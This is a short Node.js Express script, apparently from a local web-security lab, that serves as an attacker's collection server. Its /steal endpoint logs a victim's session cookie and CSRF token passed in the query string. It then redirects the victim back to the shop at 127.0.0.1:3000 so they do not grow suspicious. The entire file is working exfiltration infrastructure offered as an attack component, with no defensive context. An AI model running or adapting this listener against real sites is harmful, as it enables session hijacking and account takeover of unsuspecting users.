// attacker_listener.js
const express = require('express');
const app = express();

app.get('/steal', (req, res) => {
    console.log('--- 💀 SHOP LOOT RECEIVED! 💀 ---');
    console.log('Stolen Session Cookie:');
    console.log(decodeURIComponent(req.query.cookie));
    console.log('');
    console.log('Stolen CSRF Token:');
    console.log(decodeURIComponent(req.query.token));
    console.log('---------------------------------');
    
    // Redirect back to the shop so the victim is not suspicious
    res.redirect('http://127.0.0.1:3000');
});

app.listen(4000, () => {
    console.log('[ATTACKER] Listener server running on http://127.0.0.1:4000');
});
